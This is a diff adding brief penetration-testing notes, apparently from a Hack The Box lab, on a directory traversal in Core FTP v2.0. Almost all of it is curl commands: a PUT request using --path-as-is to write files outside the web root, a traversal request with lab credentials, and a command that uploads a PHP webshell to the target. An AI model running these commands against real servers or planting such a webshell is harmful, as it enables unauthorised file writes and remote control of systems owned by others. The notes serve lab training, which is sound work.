@@ -1,0 +1,9 @@
+- FTP::21 -- Core FTP v2.0 -- File Traversal (with authentication)
+curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
+
+command being used:
+curl -k -H "Host: inlanefreight.htb" --basic -u fiona:987654321 https://inlanefreight.htb/../../../../
+
+If avaiable, you can then UPLOAD a webshell using curl:
+curl -k -X PUT -H "Host: inlanefreight.htb" --basic -u fiona:987654321 --data-binary @webshell.php --path-as-is https://inlanefreight.htb/webshell.php
+(if you navigate to this in the url and the browser tries to download the php, then try something else.)
